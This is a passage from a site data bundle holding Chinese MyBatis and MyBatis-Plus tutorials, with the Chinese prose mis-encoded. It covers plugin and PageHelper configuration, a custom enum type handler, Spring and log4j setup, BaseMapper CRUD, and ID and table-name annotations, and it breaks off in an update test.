}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<plugins>\n    <plugin interceptor="com.pwddd.mybatis.plugins.myfirstplugin">\n        <property name="haha" value="123"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# æ©å±\n\n\n# åé¡µ\n\nåé¡µæä»¶å°åï¼mybatis-pagehelper-doc\n\n 1. å¼å¥ä¾èµ\n\n<dependency>\n    <groupid>com.github.pagehelper</groupid>\n    <artifactid>pagehelper</artifactid>\n    <version>5.3.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. å¼å¥æä»¶\n\n\x3c!-- \n        pluginså¨éç½®æä»¶ä¸­çä½ç½®å¿é¡»ç¬¦åè¦æ±ï¼å¦åä¼æ¥éï¼é¡ºåºå¦ä¸:\n        properties?, settings?, \n        typealiases?, typehandlers?, \n        objectfactory?,objectwrapperfactory?, \n        plugins?, \n        environments?, databaseidprovider?, mappers?\n    --\x3e\n<plugins>\n    \x3c!-- com.github.pagehelperä¸ºpagehelperç±»æå¨åå --\x3e\n    <plugin interceptor="com.github.pagehelper.pageinterceptor">\n        \x3c!-- ä½¿ç¨ä¸é¢çæ¹å¼éç½®åæ°ï¼åé¢ä¼æææçåæ°ä»ç» --\x3e\n        <property name="param1" value="value1"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå·ä½ä½¿ç¨æ¹æ³æ¥çææ¡£ã\n\n\n# æ¹éæä½\n\nsqlsession opensession = sqlsessionfactory.opensession(executortype.batch);\n\n\n1\n\n\nspringæ´åæ¶å¯ä»¥æ³¨å¥ä¸ä¸ªbeanï¼ç¶åautowiredèªå¨æ³¨å¥å°daoå±ï¼ä½¿ç¨è¯¥beanåå»ºmapperä»£çç±»å¯¹è±¡ï¼è¿è¡æ¥è¯¢ã\n\n\n# èªå®ä¹ç±»åå¤çå¨ type handler\n\n\npublic class myenumempstatustypehandler implements typehandler<empstatus> {\n\n\t/**\n\t * å®ä¹å½åæ°æ®å¦ä½ä¿å­å°æ°æ®åºä¸­\n\t */\n\t@override\n\tpublic void setparameter(preparedstatement ps, int i, empstatus parameter,\n\t\t\tjdbctype jdbctype) throws sqlexception {\n\t\t// todo auto-generated method stub\n\t\tsystem.out.println("è¦ä¿å­çç¶æç ï¼"+parameter.getcode());\n\t\tps.setstring(i, parameter.getcode().tostring());\n\t}\n\n\t@override\n\tpublic empstatus getresult(resultset rs, string columnname)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\t//éè¦æ ¹æ®ä»æ°æ®åºä¸­æ¿å°çæä¸¾çç¶æç è¿åä¸ä¸ªæä¸¾å¯¹è±¡\n\t\tint code = rs.getint(columnname);\n\t\tsystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n\t@override\n\tpublic empstatus getresult(resultset rs, int columnindex)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\tint code = rs.getint(columnindex);\n\t\tsystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n\t@override\n\tpublic empstatus getresult(callablestatement cs, int columnindex)\n\t\t\tthrows sqlexception {\n\t\t// todo auto-generated method stub\n\t\tint code = cs.getint(columnindex);\n\t\tsystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tempstatus status = empstatus.getempstatusbycode(code);\n\t\treturn status;\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n<typehandlers>\n    \x3c!--1ãéç½®æä»¬èªå®ä¹çtypehandler  --\x3e\n    <typehandler handler="com.atguigu.mybatis.typehandler.myenumempstatustypehandler" javatype="com.atguigu.mybatis.bean.empstatus"/>\n    \x3c!--2ãä¹å¯ä»¥å¨å¤çæä¸ªå­æ®µçæ¶ååè¯mybatisç¨ä»ä¹ç±»åå¤çå¨\n    ä¿å­ï¼#{empstatus,typehandler=xxxx}\n    æ¥è¯¢ï¼\n     <resultmap type="com.atguigu.mybatis.bean.employee" id="myemp">\n       <id column="id" property="id"/>\n       <result column="empstatus" property="empstatus" typehandler=""/>\n      </resultmap>\n    æ³¨æï¼å¦æå¨åæ°ä½ç½®ä¿®æ¹typehandlerï¼åºè¯¥ä¿è¯ä¿å­æ°æ®åæ¥è¯¢æ°æ®ç¨çtypehandleræ¯ä¸æ ·çã\n    --\x3e\n</typehandlers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"MyBatis-Plus",frontmatter:{title:"MyBatis-Plus",date:"2022-01-16T00:00:00.000Z",permalink:"/dev/java/core/mybatisplus",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis","MyBatisPlus"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/03.MyBatisPlus.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/03.MyBatisPlus.md",key:"v-68562108",path:"/dev/java/core/mybatisplus/",headers:[{level:2,title:"ç¸å³èµæº",slug:"ç¸å³èµæº",normalizedTitle:"ç¸å³èµæº",charIndex:132},{level:2,title:"åæåå¤",slug:"åæåå¤",normalizedTitle:"åæåå¤",charIndex:193},{level:3,title:"åå»ºåºè¡¨",slug:"åå»ºåºè¡¨",normalizedTitle:"åå»ºåºè¡¨",charIndex:202},{level:3,title:"ç¼åå¯¹åºçjavaBean",slug:"ç¼åå¯¹åºçjavabean",normalizedTitle:"ç¼åå¯¹åºçjavabean",charIndex:819},{level:3,title:"å¯¼å¥ä¾èµ",slug:"å¯¼å¥ä¾èµ",normalizedTitle:"å¯¼å¥ä¾èµ",charIndex:2484},{level:3,title:"springéç½®æä»¶éç½®",slug:"springéç½®æä»¶éç½®",normalizedTitle:"springéç½®æä»¶éç½®",charIndex:3843},{level:3,title:"log4jéç½®æä»¶",slug:"log4jéç½®æä»¶",normalizedTitle:"log4jéç½®æä»¶",charIndex:6106},{level:3,title:"mybatiséç½®æä»¶",slug:"mybatiséç½®æä»¶",normalizedTitle:"mybatiséç½®æä»¶",charIndex:6917},{level:3,title:"æ¿æ¢mybatisplus",slug:"æ¿æ¢mybatisplus",normalizedTitle:"æ¿æ¢mybatisplus",charIndex:7153},{level:2,title:"å¥é¨éç¨CRUD",slug:"å¥é¨éç¨crud",normalizedTitle:"å¥é¨éç¨crud",charIndex:7352},{level:3,title:"Insert",slug:"insert",normalizedTitle:"insert",charIndex:7365},{level:3,title:"Update",slug:"update",normalizedTitle:"update",charIndex:11855},{level:3,title:"Select",slug:"select",normalizedTitle:"select",charIndex:12369},{level:3,title:"delete",slug:"delete",normalizedTitle:"delete",charIndex:14570},{level:3,title:"MPå¯å¨æ³¨å¥SQLçåç",slug:"mpå¯å¨æ³¨å¥sqlçåç",normalizedTitle:"mpå¯å¨æ³¨å¥sqlçåç",charIndex:15083},{level:2,title:"æ¡ä»¶æé å¨",slug:"æ¡ä»¶æé å¨",normalizedTitle:"æ¡ä»¶æé å¨",charIndex:15409},{level:2,title:"æ´»å¨è®°å½ - ActiveRecord",slug:"æ´»å¨è®°å½-activerecord",normalizedTitle:"æ´»å¨è®°å½ - activerecord",charIndex:17263},{level:2,title:"ä»£ç çæå¨",slug:"ä»£ç çæå¨",normalizedTitle:"ä»£ç çæå¨",charIndex:19031},{level:2,title:"æä»¶",slug:"æä»¶",normalizedTitle:"æä»¶",charIndex:14562},{level:3,title:"åé¡µæä»¶",slug:"åé¡µæä»¶",normalizedTitle:"åé¡µæä»¶",charIndex:14560},{level:3,title:"æ§è¡åææä»¶",slug:"æ§è¡åææä»¶",normalizedTitle:"æ§è¡åææä»¶",charIndex:21527},{level:3,title:"ä¹è§éæä»¶",slug:"ä¹è§éæä»¶",normalizedTitle:"ä¹è§éæä»¶",charIndex:21821},{level:3,title:"æ§è¡åææä»¶",slug:"æ§è¡åææä»¶-2",normalizedTitle:"æ§è¡åææä»¶",charIndex:21527},{level:3,title:"æµè¯ä»£ç ",slug:"æµè¯ä»£ç ",normalizedTitle:"æµè¯ä»£ç ",charIndex:22412},{level:2,title:"èªå®ä¹å¨å±æä½",slug:"èªå®ä¹å¨å±æä½",normalizedTitle:"èªå®ä¹å¨å±æä½",charIndex:24365},{level:3,title:"AutoSqlInjector",slug:"autosqlinjector",normalizedTitle:"autosqlinjector",charIndex:15376},{level:3,title:"é»è¾å é¤",slug:"é»è¾å é¤",normalizedTitle:"é»è¾å é¤",charIndex:26116},{level:2,title:"å¬å±å­æ®µèªå¨å¡«å",slug:"å¬å±å­æ®µèªå¨å¡«å",normalizedTitle:"å¬å±å­æ®µèªå¨å¡«å",charIndex:26959},{level:2,title:"Ideaæä»¶",slug:"ideaæä»¶",normalizedTitle:"ideaæä»¶",charIndex:28459}],headersStr:"ç¸å³èµæº åæåå¤ åå»ºåºè¡¨ ç¼åå¯¹åºçjavaBean å¯¼å¥ä¾èµ springéç½®æä»¶éç½® log4jéç½®æä»¶ mybatiséç½®æä»¶ æ¿æ¢mybatisplus å¥é¨éç¨CRUD Insert Update Select delete MPå¯å¨æ³¨å¥SQLçåç æ¡ä»¶æé å¨ æ´»å¨è®°å½ - ActiveRecord ä»£ç çæå¨ æä»¶ åé¡µæä»¶ æ§è¡åææä»¶ ä¹è§éæä»¶ æ§è¡åææä»¶ æµè¯ä»£ç  èªå®ä¹å¨å±æä½ AutoSqlInjector é»è¾å é¤ å¬å±å­æ®µèªå¨å¡«å Ideaæä»¶",content:'# MyBatisPlus\n\n> MyBatis-Plus(ç®ç§° MP),æ¯ä¸ä¸ª MyBatis çå¢å¼ºå·¥å·åï¼åªåå¢å¼ºä¸åæ¹åã ä¸ºç®åå¼åå·¥ä½ãæé«çäº§çèçæä»¬çæ¿æ¯æ¯æä¸º Mybatisæå¥½çæ­æ¡£ï¼å°±åé­æç½ä¸­ç 1Pã2Pï¼åºåæ­éï¼æçç¿»åã\n\n\n# ç¸å³èµæº\n\nMyBatis-Plus (baomidou.com)\n\nGitHub - mybatis-plus\n\n\n# åæåå¤\n\n\n# åå»ºåºè¡¨\n\n-- åå»ºåº\nCREATE DATABASE mp;\n-- ä½¿ç¨åº\nUSE mp;\n-- åå»ºè¡¨\nCREATE TABLE tbl_employee(\n id INT(11) PRIMARY KEY AUTO_INCREMENT,\n last_name VARCHAR(50),\n email VARCHAR(50),\n gender CHAR(1),\n age int\n);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Tom\',\'tom@atguigu.com\',1,22);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Jerry\',\'jerry@atguigu.com\',0,25);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'Black\',\'black@atguigu.com\',1,30);\nINSERT INTO tbl_employee(last_name,email,gender,age) VALUES(\'White\',\'white@atguigu.com\',0,35);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ç¼åå¯¹åºçjavaBean\n\npackage com.pwddd.mp.bean;\n\npublic class Employee {\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender;\n    private Integer age;\n\n    @Override\n    public String toString() {\n        return "Employee{" +\n                "id=" + id +\n                ", lastName=\'" + lastName + \'\\\'\' +\n                ", email=\'" + email + \'\\\'\' +\n                ", gender=" + gender +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getLastName() {\n        return lastName;\n    }\n\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public Integer getGender() {\n        return gender;\n    }\n\n    public void setGender(Integer gender) {\n        this.gender = gender;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public Employee() {\n    }\n\n    public Employee(Integer id, String lastName, String email, Integer gender, Integer age) {\n        this.id = id;\n        this.lastName = lastName;\n        this.email = email;\n        this.gender = gender;\n        this.age = age;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# å¯¼å¥ä¾èµ\n\n<dependencies>\n\n    \x3c!-- mp ä¾èµ --\x3e\n    <dependency>\n        <groupId>com.baomidou</groupId>\n        <artifactId>mybatis-plus</artifactId>\n        <version>2.3</version>\n    </dependency>\n    \x3c!--junit --\x3e\n    <dependency>\n        <groupId>junit</groupId>\n        <artifactId>junit</artifactId>\n        <version>4.9</version>\n    </dependency>\n    \x3c!-- log4j --\x3e\n    <dependency>\n        <groupId>log4j</groupId>\n        <artifactId>log4j</artifactId>\n        <version>1.2.17</version>\n    </dependency>\n    \x3c!-- c3p0 --\x3e\n    <dependency>\n        <groupId>com.mchange</groupId>\n        <artifactId>c3p0</artifactId>\n        <version>0.9.5.2</version>\n    </dependency>\n    \x3c!-- mysql --\x3e\n    <dependency>\n        <groupId>mysql</groupId>\n        <artifactId>mysql-connector-java</artifactId>\n        <version>5.1.37</version>\n    </dependency>\n    \x3c!-- spring --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-context</artifactId>\n        <version>4.3.10.RELEASE</version>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-orm</artifactId>\n        <version>4.3.10.RELEASE</version>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# springéç½®æä»¶éç½®\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n        xmlns:context="http://www.springframework.org/schema/context"\n        xmlns:tx="http://www.springframework.org/schema/tx"\n        xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd\n        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd">\n        \x3c!-- æ°æ®æº --\x3e\n    <context:property-placeholder location="classpath:db.properties"/>\n    <bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource">\n        <property name="driverClass" value="${jdbc.driver}" />\n        <property name="jdbcUrl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n        \x3c!-- äºå¡ç®¡çå¨ --\x3e\n    <bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n        \x3c!-- åºäºæ³¨è§£çäºå¡ç®¡ç --\x3e\n    <tx:annotation-driven transaction-manager="dataSourceTransactionManager"/>\n            \x3c!-- éç½® SqlSessionFactoryBean --\x3e\n\x3c!--      <bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">  --\x3e\n        \x3c!-- æ°æ®æº --\x3e\n\n        <bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean">\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- å«åå¤ç --\x3e\n        <property name="typeAliasesPackage" value="com.pwddd.mp.beans" />\n    </bean>\n        \x3c!--\n        éç½® mybatis æ«æ mapper æ¥å£çè·¯å¾\n        --\x3e\n    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">\n        <property name="basePackage" value="com.pwddd.mp.mapper" />\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# log4jéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE log4j:configuration SYSTEM "log4j.dtd">\n<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/">\n    <appender name="STDOUT" class="org.apache.log4j.ConsoleAppender">\n        <param name="Encoding" value="UTF-8" />\n        <layout class="org.apache.log4j.PatternLayout">\n            <param name="ConversionPattern" value="%-5p %d{MM-dd HH:mm:ss,SSS} %m (%F:%L) \\n" />\n        </layout>\n    </appender>\n    <logger name="java.sql">\n        <level value="debug" />\n    </logger>\n    <logger name="org.apache.ibatis">\n        <level value="info" />\n    </logger>\n    <root>\n        <level value="debug" />\n        <appender-ref ref="STDOUT" />\n    </root>\n</log4j:configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# mybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æ¿æ¢mybatisplus\n\nspringéç½®æä»¶ä¸­å°æä»¬æ·»å çsqlSessionFactoryBeanæ¿æ¢ä¸ºMybatisSqlSessionFactoryBeanã\n\n<bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">\n\n\n1\n\n\n\n# å¥é¨éç¨CRUD\n\n\n# Insert\n\næåºé®é¢: åè®¾æä»¬å·²å­å¨ä¸å¼ tbl_employeeè¡¨ï¼ä¸å·²æå¯¹åºçå®ä½ç±»Employeeï¼å®ç°tbl_employeeè¡¨çCRUDæä½æä»¬éè¦åä»ä¹å¢ï¼\n\nå®ç°æ¹å¼:\n\nåºäºMybatisï¼éè¦ç¼åEmployeeMapperæ¥å£ï¼å¹¶æå¨ç¼åCRUDæ¹æ³ æä¾EmployeeMapper.xmlæ å°æä»¶ï¼å¹¶æå¨ç¼åæ¯ä¸ªæ¹æ³å¯¹åºçSQLè¯­å¥.\n\nåºäºMPï¼åªéè¦åå»ºEmployeeMapperæ¥å£, å¹¶ç»§æ¿BaseMapperæ¥å£.è¿å°±æ¯ä½¿ç¨MPéè¦å®æçæææä½ï¼çè³ä¸éè¦åå»ºSQLæ å°æä»¶ã\n\n 1. ç¼åæ¥å£éæBaseMapper\n\npackage com.pwddd.mp.mapper;\n\nimport com.baomidou.mybatisplus.mapper.BaseMapper;\nimport com.pwddd.mp.bean.Employee;\n\n// æ³å å¡«åå½åMapperæå¯¹åºçå®ä½ç±»\npublic interface EmployeeMapper extends BaseMapper<Employee> {\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. ç¼åæµè¯æ¹æ³\n\nprivate ApplicationContext ac = new ClassPathXmlApplicationContext("applicationContext.xml");\nprivate EmployeeMapper employeeMapper = ac.getBean("employeeMapper", EmployeeMapper.class);\n\n@Test\npublic void testEnv() throws SQLException {\n    Employee employee = new Employee();\n    employee.setLastName("zhangsan");\n    employee.setEmail("zhangsan@qq.com");\n    employee.setGender(1);\n    employee.setAge(24);\n    System.out.println(employeeMapper.insert(employee));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿è¡æ¶ä¼æå¼å¸¸ï¼ä¸»è¦åå æ¶idçç±»åä¸ºé®é¢ã\n\n Could not set property \'id\' of \'class com.pwddd.mp.bean.Employee\' with value \'1496379627045040130\' Cause: java.lang.IllegalArgumentException: argument type mismatch\n\n\n1\n\n\nåºç°å¼å¸¸çåå ï¼mybatisplusæä¾äºåç§ä¸»é®çç­ç¥ãæä»¬å¹¶æ²¡æè®¾ç½®ä¸»é®çç­ç¥ï¼å¯¹äºMybatisPlusæ¥è¯´ï¼æå¦ä¸çå ç§ä¸»é®ç­ç¥:\n\nå¼               æè¿°\nAUTO            æ°æ®åº ID èªå¢\nNONE            æ ç¶æï¼è¯¥ç±»åä¸ºæªè®¾ç½®ä¸»é®ç±»åï¼æ³¨è§£éç­äºè·éå¨å±ï¼å¨å±éçº¦ç­äº INPUTï¼\nINPUT           insert åèªè¡ set ä¸»é®å¼\nASSIGN_ID       åé ID(ä¸»é®ç±»åä¸º Number(Long å Integer)æ String)(since\n                3.3.0),ä½¿ç¨æ¥å£IdentifierGeneratorçæ¹æ³nextId(é»è®¤å®ç°ç±»ä¸ºDefaultIdentifierGeneratoréªè±ç®æ³)\nASSIGN_UUID     åé UUID,ä¸»é®ç±»åä¸º String(since\n                3.3.0),ä½¿ç¨æ¥å£IdentifierGeneratorçæ¹æ³nextUUID(é»è®¤ default æ¹æ³)\nID_WORKER       åå¸å¼å¨å±å¯ä¸ ID é¿æ´åç±»å(please use ASSIGN_ID) å¼ç¨\nUUID            32 ä½ UUID å­ç¬¦ä¸²(please use ASSIGN_UUID) å¼ç¨\nID_WORKER_STR   åå¸å¼å¨å±å¯ä¸ ID å­ç¬¦ä¸²ç±»å(please use ASSIGN_ID) å¼ç¨\n\nå¨å¼åè¿ç¨ä¸­ï¼ä½¿ç¨TableIdè®¾ç½®ä¸»é®ç­ç¥ãå±æä¸¤ä¸ªå±æ§ï¼\n\n * value: å¦æè¡¨ä¸­æ°æ®çå¼åé¡¹ç®ä¸­beançå±æ§åä¸åï¼æèä¸éµè¡é©¼å³°å½åæ³ï¼åéè¦è¿è¡è®¾ç½®\n * type: è®¾ç½®ä¸»é®ç­ç¥IdTypeçæä¸¾ï¼éè¦å¯¹åºè¡¨ä¸­çä¸»é®çç­ç¥ã\n\npublic class Employee {\n\n    @TableId(value = "id",type = IdType.AUTO)\n    private Integer id;\n\n\n1\n2\n3\n4\n\n\nä¿®æ¹ååæ¥éï¼\n\n### Error updating database.  Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table \'mybatisplus.employee\' doesn\'t exist\n\n\n1\n\n\nåºç°è¿ä¸ªé®é¢çåå æ¯ï¼mybatisplusä¼æ ¹æ®å®ä½ç±»çç±»åå»æ°æ®åºä¸­æ¾ç¸å³çè¡¨åãå ä¸ºæä»¬æ°æ®åºä¸­çè¡¨åç§°åç±»åå¹¶ä¸å¯¹åºï¼å æ­¤ä¼æ¥éãmybatisplusä¹æä¾äºç¸å³çæ³¨è§£å»è®¾ç½®å¯»æ¾çåç§°ãTableName\n\n@TableName("tbl_employee")\npublic class Employee {\n\n\n1\n2\n\n\nå¦ææ°æ®åºçç¸å³ååå®ä½ç±»ççåç§°ä¸å¯¹åºï¼(å¦last_nameålastName)ãmybaitsPlusæ¯å¦ä½ä¿è¯æ°æ®è½å¤è½¬åã\n\nMPå¨å±ç­ç¥éç½®ä¸­æå¦ä¸çé»è®¤éç½®ï¼è¯¥éç½®ç±»ä¼¼äºmybatisçé©¼å³°å½åæ³çè½¬åï¼å¹¶ä¸é»è®¤å¼å¯ã\n\n<bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n    <property name="dbColumnUnderline" value="true" />\n</bean>\n\n\n1\n2\n3\n\n\nå¦ææä»¬å°è¯¥å­æ®µä¿®æ¹ä¸ºfalseï¼é£ä¹MPå¹¶ä¸ä¼èªå¨å°é©¼å³°å½åè¿è¡å¹éãæä»¬è¿å¯ä»¥éè¿@TableFiledæ³¨è§£ï¼ç¨Valueæå®å¯¹åºçæ°æ®åºååç§°ãexistè¡¨ç¤ºå¨æ°æ®åºä¸­ææ²¡æå¯¹åºçå­æ®µå­å¨ï¼é»è®¤æ¯å¨æ°æ®åºä¸­æå¯¹åºçå­æ®µãå¦æå¯¹åºçjavaBeanå¨è¡¨ä¸­æ²¡æç¸å³çæ å°ï¼é£ä¹å¨è¿è¡æ°æ®åºæä½æ¶å°±ä¼æ¥éï¼æä»¬å°è¯¥å­æ®µçexistè®¾ç½®æfalseï¼å°±å¯ä»¥å¿½ç¥è¿ä¸ªå­æ®µã\n\n@TableField(value = "last_name")\nprivate String lastName;\n\n@TableField(exist = false)\nprivate Double salary;\n\n\n1\n2\n3\n4\n5\n\n\né£ä¹å¯¹äºæä»¬çä¸»é®ç­ç¥ï¼åå¯¹åºçè¡¨åç§°çæ å°ï¼å¦ææ¯ä¸ªå®ä½ç±»é½éè¦è¿è¡éç½®ï¼åè¿äºéº»ç¦ï¼MPæä¾äºå¨å±éç½®çæ¹å¼ã\n\n<bean id="globalConfiguration" class="com.baomidou.mybatisplus.entity.GlobalConfiguration">\n    <property name="dbColumnUnderline" value="true" />\n    \x3c!--å¨å±éç½® --\x3e\n    <property name="idType" value="0" />\n</bean>\n\n\n1\n2\n3\n4\n5\n\n\næä»¬éç½®äºidTypeä¸º0ä¹åï¼ä¼è°ç¨æä¸¾ç±»çgetIdTypeæ¹æ³ï¼è¯¥æ¹æ³æ ¹æ®æä»¬ä¼ å¥çIdTypeçkeyå»æ¾å¯¹åºçä¸»é®ç­ç¥ç±»å\n\n\n\næä»¬å ä¸å¨å±çéç½®ä¹åï¼è¿éè¦å°éç½®æ³¨å¥å°sqlsessionä¸­ï¼å¦åä¸ä¼èµ·ä½ç¨ã\n\n    <bean id="sqlSessionFactoryBean" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean">\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        \x3c!-- å«åå¤ç --\x3e\n        <property name="typeAliasesPackage" value="com.pwddd.mp.beans" />\n        <property name="globalConfig" ref="globalConfiguration" />\n    </bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@TableNameæ³¨è§£ä¼æå®å®ä½ç±»å¯¹åºçè¡¨åç§°ï¼æä»¬å¨åå»ºæ°æ®åºè¡¨çæ¶åéå¸¸ä¼ç»è¡¨å ä¸ä¸äºåºå®çè¡¨åç¼ï¼è¿ä¼å¯¼è´æä»¬çå®ä½ç±»åè¡¨åç§°ä¸å¯¹åºãå æ­¤å¨MPä¸­ä¹æä¾äºæ·»å è¡¨åç¼çå¨å±éç½®ã\n\n<property name="tablePrefix" value="tbl_" />\n\n\n1\n\n\nå¨Mybatiséé¢ï¼å¨æå¥æä½åå¦æéè¦è·åmybatisæå¥ä¹åæ°æ®çä¸»é®å¼ï¼éè¦å¨mapperæ å°æä»¶ä¸­çselectæ ç­¾éé¢è®¾ç½®ä¸¤ä¸ªæ ç­¾å¼ï¼ä¸ä¸ªæ¯ä¸»é®çèªå¢ï¼ä¸ä¸ªæ¯æä»¬è¿åå°æå¥å®ä½çjavabeançå¯¹åºå±æ§ã\n\nuseGeneratedKeys="true" keyProperty="userId"\n\n\n1\n\n\n**èå¨MybatisPlusä¸­ä¼èªå¨å°æå¥æ°æ®çä¸»é®å¼èªå¨æ³¨å¥å°æä»¬çæå¥å®ä½ä¸­ã**ä¸éè¦æä»¬è¿è¡ä»»ä½æä½ã\n\ninsertæ¹æ³å¨è¿è¡æå¥æä½æ¶ï¼ä¼èªå¨çå¤æ­æå¥å­æ®µå¯¹åºçå¼æ¯å¦ä¸ºnullï¼å¦æä¸ºnullåå¨æå¥æä½ä¸­å°±ä¸æå¥è¯¥å¼äºãå¦ææä»¬éè¦å¨å­æ®µçæå¥å¼ï¼æä»¬éè¦ä½¿ç¨insertAllColumnæ¹æ³ã\n\nDEBUG 02-23 15:36:22,520 ==>  Preparing: INSERT INTO tbl_employee ( last_name,email,gender,age ) VALUES ( ?,?,?,? )  (JakartaCommonsLoggingImpl.java:54) \n\n\n1\n\n\n\n# Update\n\nMPä¸ºæä»¬æä¾äºéç¨çupdateæ¹æ³ï¼updateByIdï¼åä¸é¢çinsertä¸æ ·ï¼å¦æä¸ä¼ å¥å¯¹åºçåæ°ï¼åMPä¸ä¼å¯¹è¯¥åæ°å¯¹åºçæ°æ®åºåå¼è¿è¡ä¿®æ¹ãåæ¶MPè¿æä¾äºç±»ä¼¼insertAllColumnsçæ¹æ³updateAllColumnsByIdã\n\n@Test\npublic void testUpdate(){\n    Employee employee = new Employee();\n    employee.setId(1);\n    employee.setAge(11);\n    employee.setGender(1);\n    //        employee.setEmail("helo@qq.com");\n    //        employee.setLastName("haha");\n    //        